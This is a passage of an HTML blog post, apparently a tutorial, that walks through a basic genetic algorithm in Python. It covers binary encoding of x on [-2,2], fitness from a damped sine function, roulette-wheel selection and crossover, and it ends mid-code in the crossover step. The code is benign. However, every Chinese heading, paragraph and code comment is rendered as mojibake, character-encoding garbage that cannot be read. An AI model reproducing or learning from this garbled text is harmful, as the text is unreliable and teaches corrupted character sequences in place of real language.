        <content type="html"><![CDATA[<p>‚Ä¶‚Ä¶</p><a id="more"></a><h1 id="ÈÅó‰º†ÁÆóÊ≥ïÔºàGenetic-AlgorithmÔºâ"><a href="#ÈÅó‰º†ÁÆóÊ≥ïÔºàGenetic-AlgorithmÔºâ" class="headerlink" title="ÈÅó‰º†ÁÆóÊ≥ïÔºàGenetic AlgorithmÔºâ"></a>ÈÅó‰º†ÁÆóÊ≥ïÔºàGenetic AlgorithmÔºâ</h1><blockquote><p>ÁÆóÊ≥ïÈÉΩÊòØÁî®Êù•Ëß£ÂÜ≥ÂÆûÈôÖÈóÆÈ¢òÔºåÊèêÈ´òÊïàÁéáÁöÑÔºåËÄåÂ≠¶Â•ΩÁÆóÊ≥ïÂØπ‰∏Ä‰∏™‰ø°ÊÅØÂÆâÂÖ®‰ªé‰∏öËÄÖÊù•ËØ¥ÔºåÂ∫îËØ•‰πüÊòØÂøÖË¶ÅÁöÑ„ÄÇÂºÄÂßãÊé•Ëß¶Ëøô‰∫õÁÆóÊ≥ïÔºå‰πüÈÄêÊ∏êÊÑèËØÜÂà∞Áü•ËØÜÈù¢ÂπøÈòîÁöÑÈáçË¶ÅÔºåÊØîÂ¶ÇÈÅó‰º†ÁÆóÊ≥ïÂ∞±ÈúÄË¶ÅÁü•ÈÅì‰∏ÄÂÆöÁöÑÁîüÁâ©Áü•ËØÜÔºåÂèØËÉΩËøôÂ∞±ÊòØÂüπËÆ≠Êú∫ÊûÑÊó†Ê≥ïÂº•Ë°•ÁöÑÂú∞ÊñπÂêß„ÄÇ</p></blockquote><h2 id="ÁÆÄ‰ªã"><a href="#ÁÆÄ‰ªã" class="headerlink" title="ÁÆÄ‰ªã"></a>ÁÆÄ‰ªã</h2><p>ÂÖàÂºïÁî®‰∏Ä‰∏ãÈÅó‰º†ÁÆóÊ≥ïÁöÑËß£ÈáäÔºö</p><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>ÈÅó‰º†ÁÆóÊ≥ïÔºàGenetic AlgorithmÔºâ</strong>ÊòØÊ®°ÊãüËææÂ∞îÊñáÁîüÁâ©ËøõÂåñËÆ∫ÁöÑËá™ÁÑ∂ÈÄâÊã©ÂíåÈÅó‰º†Â≠¶Êú∫ÁêÜÁöÑÁîüÁâ©ËøõÂåñËøáÁ®ãÁöÑËÆ°ÁÆóÊ®°ÂûãÔºåÊòØ‰∏ÄÁßçÈÄöËøáÊ®°ÊãüËá™ÁÑ∂ËøõÂåñËøáÁ®ãÊêúÁ¥¢ÊúÄ‰ºòËß£ÁöÑÊñπÊ≥ï„ÄÇÈÅó‰º†ÁÆóÊ≥ïÊòØ‰ªé‰ª£Ë°®ÈóÆÈ¢òÂèØËÉΩÊΩúÂú®ÁöÑËß£ÈõÜÁöÑ‰∏Ä‰∏™<strong>ÁßçÁæ§ÔºàpopulationÔºâ</strong>ÂºÄÂßãÁöÑÔºåËÄå‰∏Ä‰∏™ÁßçÁæ§ÂàôÁî±ÁªèËøá<strong>Âü∫Âõ†ÔºàgeneÔºâ</strong>ÁºñÁ†ÅÁöÑ‰∏ÄÂÆöÊï∞ÁõÆÁöÑ<strong>‰∏™‰Ωì(individual)</strong>ÁªÑÊàê„ÄÇ</p><p>&nbsp; &nbsp; &nbsp; &nbsp; ÊØè‰∏™‰∏™‰ΩìÂÆûÈôÖ‰∏äÊòØ<strong>ÊüìËâ≤‰Ωì(chromosome)</strong>Â∏¶ÊúâÁâπÂæÅÁöÑÂÆû‰Ωì„ÄÇÊüìËâ≤‰Ωì‰Ωú‰∏∫ÈÅó‰º†Áâ©Ë¥®ÁöÑ‰∏ªË¶ÅËΩΩ‰ΩìÔºåÂç≥Â§ö‰∏™Âü∫Âõ†ÁöÑÈõÜÂêàÔºåÂÖ∂ÂÜÖÈÉ®Ë°®Áé∞ÔºàÂç≥Âü∫Âõ†ÂûãÔºâÊòØÊüêÁßçÂü∫Âõ†ÁªÑÂêàÔºåÂÆÉÂÜ≥ÂÆö‰∫Ü‰∏™‰ΩìÁöÑÂΩ¢Áä∂ÁöÑÂ§ñÈÉ®Ë°®Áé∞ÔºåÂ¶ÇÈªëÂ§¥ÂèëÁöÑÁâπÂæÅÊòØÁî±ÊüìËâ≤‰Ωì‰∏≠ÊéßÂà∂Ëøô‰∏ÄÁâπÂæÅÁöÑÊüêÁßçÂü∫Âõ†ÁªÑÂêàÂÜ≥ÂÆöÁöÑ„ÄÇÂõ†Ê≠§ÔºåÂú®‰∏ÄÂºÄÂßãÈúÄË¶ÅÂÆûÁé∞‰ªéË°®Áé∞ÂûãÂà∞Âü∫Âõ†ÂûãÁöÑÊò†Â∞ÑÂç≥ÁºñÁ†ÅÂ∑•‰Ωú„ÄÇÁî±‰∫é‰ªøÁÖßÂü∫Âõ†ÁºñÁ†ÅÁöÑÂ∑•‰ΩúÂæàÂ§çÊùÇÔºåÊàë‰ª¨ÂæÄÂæÄËøõË°åÁÆÄÂåñÔºåÂ¶Ç<strong>‰∫åËøõÂà∂ÁºñÁ†Å</strong>ÔºåÂàù‰ª£ÁßçÁæ§‰∫ßÁîü‰πãÂêéÔºåÊåâÁÖßÈÄÇËÄÖÁîüÂ≠òÂíå‰ºòËÉúÂä£Ê±∞ÁöÑÂéüÁêÜÔºå<strong>ÈÄê‰ª£ÔºàgenerationÔºâ</strong>ÊºîÂåñ‰∫ßÁîüÂá∫Ë∂äÊù•Ë∂äÂ•ΩÁöÑËøë‰ººËß£ÔºåÂú®ÊØè‰∏Ä‰ª£ÔºåÊ†πÊçÆÈóÆÈ¢òÂüü‰∏≠‰∏™‰ΩìÁöÑ<strong>ÈÄÇÂ∫îÂ∫¶ÔºàfitnessÔºâ</strong>Â§ßÂ∞è<strong>ÈÄâÊã©ÔºàselectionÔºâ</strong>‰∏™‰ΩìÔºåÂπ∂ÂÄüÂä©‰∫é<strong>Ëá™ÁÑ∂ÈÅó‰º†Â≠¶ÁöÑÈÅó‰º†ÁÆóÂ≠êÔºàgenetic operatorsÔºâ</strong>ËøõË°å<strong>ÁªÑÂêà‰∫§ÂèâÔºàcrossoverÔºâÂíåÂèòÂºÇÔºàmutationÔºâ</strong>Ôºå‰∫ßÁîüÂá∫‰ª£Ë°®Êñ∞ÁöÑËß£ÈõÜÁöÑÁßçÁæ§„ÄÇËøô‰∏™ËøáÁ®ãÂ∞ÜÂØºËá¥ÁßçÁæ§ÂÉè<strong>Ëá™ÁÑ∂ËøõÂåñ</strong>‰∏ÄÊ†∑ÁöÑÂêéÁîü‰ª£ÁßçÁæ§ÊØîÂâç‰ª£Êõ¥Âä†ÈÄÇÂ∫î‰∫éÁéØÂ¢ÉÔºåÊú´‰ª£ÁßçÁæ§‰∏≠ÁöÑÊúÄ‰ºò‰∏™‰ΩìÁªèËøá<strong>Ëß£Á†ÅÔºàdecodingÔºâ</strong>ÔºåÂèØ‰ª•‰Ωú‰∏∫ÈóÆÈ¢òËøë‰ººÊúÄ‰ºòËß£„ÄÇ</p><p>ÈÅó‰º†ÁÆóÊ≥ïÁöÑÁªÑÊàê‰∏ªË¶ÅÂåÖÊã¨4‰∏™ÈÉ®ÂàÜÔºö<br>Ôºà1ÔºâÁºñÁ†Å<br>Ôºà2ÔºâÈÄÇÂ∫îÂ∫¶ÂáΩÊï∞<br>Ôºà3ÔºâÈÅó‰º†ÁÆóÂ≠êÔºàÈÄâÊã©Ôºå‰∫§ÂèâÔºåÂèòÂºÇÔºâ<br>Ôºà4ÔºâËøêË°åÂèÇÊï∞ </p><p><strong>ÈÄâÊã©„ÄÅ‰∫§ÂèâÂíåÂèòÂºÇ</strong>ÊûÑÊàê‰∫ÜÈÅó‰º†ÁÆóÊ≥ïÁöÑÈÅó‰º†Êìç‰ΩúÔºõ<strong>ÂèÇÊï∞ÁºñÁ†Å„ÄÅÂàùÂßãÁæ§‰ΩìÁöÑËÆæÂÆö„ÄÅÈÄÇÂ∫îÂ∫¶ÂáΩÊï∞ÁöÑËÆæËÆ°„ÄÅÈÅó‰º†Êìç‰ΩúËÆæËÆ°„ÄÅÊéßÂà∂ÂèÇÊï∞</strong>ËÆæÂÆö‰∫î‰∏™Ë¶ÅÁ¥†ÁªÑÊàê‰∫ÜÈÅó‰º†ÁÆóÊ≥ïÁöÑÊ†∏ÂøÉÂÜÖÂÆπ„ÄÇ</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018083211.png" alt=""></p></blockquote><h2 id="ÁºñÁ†Å‰∏éËß£Á†Å"><a href="#ÁºñÁ†Å‰∏éËß£Á†Å" class="headerlink" title="ÁºñÁ†Å‰∏éËß£Á†Å"></a>ÁºñÁ†Å‰∏éËß£Á†Å</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; ÈÅó‰º†ÁÆóÊ≥ïÁöÑÂÆûË°åÔºåÈ¶ñÂÖàÈúÄË¶ÅÁ°ÆÂÆöÁºñÁ†ÅÂíåËß£Á†ÅÁöÑÂΩ¢ÂºèÔºåÁîüÁâ©‰ΩìÁöÑÈÅó‰º†Â∞±ÊòØÈÄöËøáÊüìËâ≤‰Ωì‰ª•ÂèäÂü∫Âõ†ËøõË°åÔºåÁºñÁ†ÅÂΩ¢ÂºèÂ§öÁßçÂ§öÊ†∑ÔºåËÉΩÂ§ü‰ΩøÁî®Â≠óÊØçÔºåÂÆûÊï∞ÔºåÊàñËÄÖÊòØ‰∫åËøõÂà∂Êù•ËøõË°åÁºñÁ†Å„ÄÇ‰ΩÜÊòØÂõ†‰∏∫Âçö‰∏ªÂàöÂºÄÂßãÂ≠¶ÈÅó‰º†ÁÆóÊ≥ïÔºå‰æøÊãøSGAÔºàÂü∫Êú¨ÈÅó‰º†ÁÆóÊ≥ïÔºâÊù•ÂØπÈÅó‰º†ÁÆóÊ≥ïËøõË°å‰∏Ä‰∏™ÁÆÄÂçïÁöÑÁêÜËß£„ÄÇ</p><p>Áõ¥Êé•‰∏ä‰æãÈ¢òËØ¥ÊòéÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018095823.png" alt=""></p><p>Êàë‰ª¨ÈúÄË¶ÅÊ±ÇÊ≠§ÂáΩÊï∞Âú®[-2,2]Âå∫Èó¥‰∏ãÁöÑÊúÄÂ§ßÂÄºÔºåÂÖàÁî®pythonÁîª‰∏Ä‰∏ãÂáΩÊï∞ÂõæÂΩ¢„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Author__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">import</span> math<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>linspace<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span>y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#ÈÄöËøáÂæ™ÁéØËÆ°ÁÆóÊØè‰∏Ä‰∏™xÂÄºÂØπÂ∫îÁöÑyÂÄº</span><span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">:</span>    a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ÈÄöËøámatplotlibÂ∫ìÁªòÂá∫ÂáΩÊï∞ÂõæÂΩ¢</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'local max'</span><span class="token punctuation">,</span> xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1.4</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            arrowprops<span class="token operator">=</span>dict<span class="token punctuation">(</span>facecolor<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> shrink<span class="token operator">=</span><span class="token number">0.05</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>ÂáΩÊï∞ÂõæÂÉèÂ¶Ç‰∏ãÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018183218.png" alt=""></p><p>[-2,2]Âå∫Èó¥Â∑≤ÁªèÂàÜ‰∏∫10000‰∏™Á≠â‰ªΩÔºåËÄåÊàë‰ª¨ÈúÄË¶ÅÊâæÂá∫ÊúÄÂ§ßÂÄºÔºåSGAÂü∫Êú¨ÈÅó‰º†ÁÆóÊ≥ïÂ∞±ÊòØÁî®‰∫åËøõÂà∂ÁºñÁ†ÅÊù•Ë°®Á§∫ÁöÑÔºåÈÇ£‰πàÊàë‰ª¨Êää2^14ÔºåÂç≥ÂçÅÂõõ‰Ωç‰∫åËøõÂà∂Áî®‰ΩúÁºñÁ†ÅÊù•Ë°®Á§∫‰∏™‰ΩìÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105024.png" alt=""></p></blockquote><h2 id="ÂàùÂßãÂåñÁßçÁæ§"><a href="#ÂàùÂßãÂåñÁßçÁæ§" class="headerlink" title="ÂàùÂßãÂåñÁßçÁæ§"></a>ÂàùÂßãÂåñÁßçÁæ§</h2><blockquote><p>Â∑≤ÁªèÂÜ≥ÂÆöÁî®ÂçÅÂõõ‰Ωç‰∫åËøõÂà∂Êù•Ë°®Á§∫ÁßçÁæ§‰∏™‰Ωì‰∫ÜÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•ÂØπÁßçÁæ§ËøõË°åÂàùÂßãÂåñÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ÂàùÂßãÂåñÁßçÁæ§‰∏™‰Ωì</span><span class="token keyword">def</span> <span class="token function">Init_popu</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i  <span class="token keyword">in</span> range<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>        entity<span class="token operator">=</span><span class="token string">''</span>       <span class="token comment" spellcheck="true">#ÈöèÊú∫‰∫ßÁîü‰∏™‰Ωì</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            entity <span class="token operator">=</span> entity<span class="token operator">+</span>str<span class="token punctuation">(</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>entity<span class="token punctuation">)</span>    <span class="token keyword">return</span> population</code></pre><p>Â∞ÜÁßçÁæ§ÂàùÂßãÂåñÁºñÁ†ÅÂêéÔºåËá™ÂÆö‰πâËß£Á†ÅÊñπÊ≥ïÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Ëß£Á†Å</span><span class="token keyword">def</span> <span class="token function">Decode</span><span class="token punctuation">(</span>population<span class="token punctuation">)</span><span class="token punctuation">:</span>   flag <span class="token operator">=</span> <span class="token number">0</span>   Dpopulation <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>   <span class="token comment" spellcheck="true">#print(population)</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> population<span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#Â∞Ü‰∫åËøõÂà∂ËΩ¨Êç¢‰∏∫Êï¥ÂûãÊï∞ÂÄº</span>       x <span class="token operator">=</span> eval<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>i<span class="token punctuation">)</span>       x <span class="token operator">=</span> x<span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">14</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">2</span>       Dpopulation<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># someone = str(population[flag])</span>       <span class="token comment" spellcheck="true"># express[i] = DNAdict[someone]</span>   <span class="token keyword">return</span> population<span class="token punctuation">,</span>Dpopulation   <span class="token comment" spellcheck="true">#return express</span>   <span class="token comment" spellcheck="true"># print(bx[0:100])</span>   <span class="token comment" spellcheck="true"># print(ast.literal_eval('0b'+bx[1]))</span></code></pre></blockquote><h2 id="ËÆ°ÁÆóÈÄÇÂ∫îÂ∫¶"><a href="#ËÆ°ÁÆóÈÄÇÂ∫îÂ∫¶" class="headerlink" title="ËÆ°ÁÆóÈÄÇÂ∫îÂ∫¶"></a>ËÆ°ÁÆóÈÄÇÂ∫îÂ∫¶</h2><blockquote><p>Ê†πÊçÆÁßçÁæ§‰∏™‰ΩìÁöÑÈÄÇÂ∫îÂ∫¶Êàë‰ª¨ÂèØ‰ª•ËøõË°åÂêéÈù¢ÁöÑÈÄâÊã©Ê∑òÊ±∞ÊñπÊ≥ïÔºå‰∏çÂêåÁöÑÈóÆÈ¢òÊúâ‰∏çÂêåÁöÑÈÄÇÂ∫îÂ∫¶ËÆ°ÁÆóÊñπÊ≥ï<br> ËÄåÊú¨‰æãÈ¢òÂàôÔºåÁõ¥Êé•Áî®ÁõÆÊ†áÂáΩÊï∞‰Ωú‰∏∫ÈÄÇÂ∫îÂ∫¶ÂáΩÊï∞</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Ê†πÊçÆÂáΩÊï∞ÂéüÂûãËÆ°ÁÆóË°®Áé∞ÂûãÔºàyÂÄº)ÔºåÂç≥ÈÄÇÂ∫îÂ∫¶</span><span class="token keyword">def</span> <span class="token function">gafunction</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>dpopulation<span class="token punctuation">)</span><span class="token punctuation">:</span>    y<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    flag<span class="token operator">=</span><span class="token number">0</span>    pp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#ÈÄöËøáÂæ™ÁéØËÆ°ÁÆóÊØè‰∏Ä‰∏™xÂÄºÂØπÂ∫îÁöÑyÂÄº</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dpopulation<span class="token punctuation">:</span>        a<span class="token operator">=</span> <span class="token number">200</span><span class="token operator">*</span>np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0.05</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>a<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#Áî±‰∫éÊòØËÆ°ÁÆóÊúÄÂ§ßÂÄºÔºåËã•Â≠òÂú®Ê≠£Êï∞ÂàôÁõ¥Êé•ÂéªÈô§Ë¥üÊï∞‰∏™‰Ωì</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>            flag<span class="token operator">=</span><span class="token number">1</span>    yy <span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    n<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> y<span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>                yy<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                pp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>            n<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> yy<span class="token punctuation">,</span>pp    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> y<span class="token punctuation">,</span>population</code></pre></blockquote><h2 id="ÂÆö‰πâÈÄâÊã©ÊñπÊ≥ï"><a href="#ÂÆö‰πâÈÄâÊã©ÊñπÊ≥ï" class="headerlink" title="ÂÆö‰πâÈÄâÊã©ÊñπÊ≥ï"></a>ÂÆö‰πâÈÄâÊã©ÊñπÊ≥ï</h2><blockquote><p>‰∏™‰ΩìÁîüÂ≠òÊ¶ÇÁéáÂÖ¨ÂºèÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018105143.png" alt=""></p></blockquote><blockquote><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20181018145013.png" class="lazyload"></p><p>Ê†πÊçÆÈÄÇÂ∫îÂ∫¶‰ª•ÂèäÈÅó‰º†Ê¶ÇÁéáÔºåËøõË°åÈÄâÊã©Ôºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ÂÆö‰πâÁâ©Á´ûÂ§©Êã©,Âº±ËÄÖÊ∑òÊ±∞</span><span class="token keyword">def</span> <span class="token function">selection</span><span class="token punctuation">(</span>population<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#ËΩÆÁõòËµåÈÄâÊã©,ÊüìËâ≤‰ΩìÁ¥ØËÆ°Ê¶ÇÁéá</span>    fitness_sum<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            fitness_sum<span class="token punctuation">.</span>append<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">[</span>i<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">+</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>fitness_sum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        fitness_sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">/=</span>sum<span class="token punctuation">(</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ËøõË°åÈÄâÊã©ÔºåÊ∑òÊ±∞Âº±ËÄÖÔºåËé∑ÂèñÊñ∞ÁßçÁæ§</span>    population_new<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rand<span class="token operator">=</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token number">0</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> fitness_sum<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token operator">&lt;</span>rand <span class="token operator">and</span> rand<span class="token operator">&lt;=</span>fitness_sum<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    population_new<span class="token punctuation">.</span>append<span class="token punctuation">(</span>population<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    new_population<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#Áïô‰∏ã‰ºòÁßÄ‰∏™‰Ωì</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> set<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token punctuation">:</span>        new_population<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">return</span> new_population    <span class="token comment" spellcheck="true">#return population_new</span></code></pre></blockquote><h2 id="ÂÆö‰πâ‰∫§ÂèâÊñπÊ≥ï"><a href="#ÂÆö‰πâ‰∫§ÂèâÊñπÊ≥ï" class="headerlink" title="ÂÆö‰πâ‰∫§ÂèâÊñπÊ≥ï"></a>ÂÆö‰πâ‰∫§ÂèâÊñπÊ≥ï</h2><blockquote><p>ÂÉèÊüìËâ≤‰Ωì‰∏ÄÊ†∑Ôºå‰πüËøõË°å‰∫§ÂèâÊìç‰ΩúÔºåÂπ∂‰∏îÁªô‰∏é‰∫§ÂèâÊìç‰Ωú‰∫ßÁîüÁöÑÊ¶ÇÁéáÔºö</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#‰∫§ÂèâÁÆóÂ≠ê</span><span class="token comment" spellcheck="true">#population_new‰∏∫ÈÄâÊã©‰∏ãÊù•ÁöÑÁßçÁæ§Ôºåpc‰∏∫‰∫§ÂèâÊ¶ÇÁéá</span><span class="token keyword">def</span> <span class="token function">crossover</span><span class="token punctuation">(</span>population_new<span class="token punctuation">,</span> pc<span class="token punctuation">)</span><span class="token punctuation">:</span>    half<span class="token operator">=</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>population_new<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    father<span class="token operator">=</span>population_new<span class="token punctuation">[</span><span class="token punctuation">:</span>half<span class="token punctuation">]</span>    mother<span class="token operator">=</span>population_new<span class="token punctuation">[</span>half<span class="token punctuation">:</span><span class="token punctuation">]</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>father<span class="token punctuation">)</span>    np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>mother<span class="token punctuation">)</span>    offspring<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>              <span class="token keyword">if</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>uniform<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span>pc<span class="token punctuation">:</span>            copint <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>len<span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            son<span class="token operator">=</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            daughter<span class="token operator">=</span>mother<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span>copint<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span>father<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>copint<span class="token 